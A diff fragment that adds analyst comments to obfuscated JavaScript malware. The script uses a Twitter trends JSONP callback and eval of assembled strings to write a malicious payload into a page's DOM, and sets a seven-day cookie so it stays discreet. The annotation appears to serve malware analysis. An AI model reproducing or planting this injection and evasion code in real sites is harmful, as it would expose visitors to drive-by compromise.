@@ -49,18 +49,18 @@ if (document.cookie.indexOf('rf5f6ds') == -1) { //if it doesn't contain "rf5f6ds
 
     function callback2(x) {
         window.tw = x;
-        sc('rf5f6ds', 2, 7);
-        eval(unescape(d % +cz + op + st) + 'dw(dz+cz($a+st));');
-        document.write($a);
+        sc('rf5f6ds', 2, 7); //write a new cookie into the victim's browser
+        eval(unescape(d % +cz + op + st) + 'dw(dz+cz($a+st));'); //make code executable by doign some operation between variables above
+        document.write($a); //write the malicious code into the DOM of the webpage
     }
 
     document.write("<img src='http://search.twitter.com/images/search/rss.png' width=1 height=1 style='visibility:hidden' /> <scr" + "ipt language=javascript" + " src='http://search.twitter.com/trends/daily.json?callback=callback'>" + "</scr" + "ipt>");
 } else { //if the cookie already exsits
-    $a = '';
+    $a = ''; //delete the variable to be as discret as possible
 }
 
 function sc(cnm, v, ed) { //create the cookie. cnm is the name of the cookie
     var exd = new Date();
-    exd.setDate(exd.getDate() + ed);
-    document.cookie = cnm + '=' + escape(v) + ';expires=' + exd.toGMTString();
+    exd.setDate(exd.getDate() + ed); //ed = 7, so the cookie expires in 7 days
+    document.cookie = cnm + '=' + escape(v) + ';expires=' + exd.toGMTString(); //write the cookie into victim's browser
 };
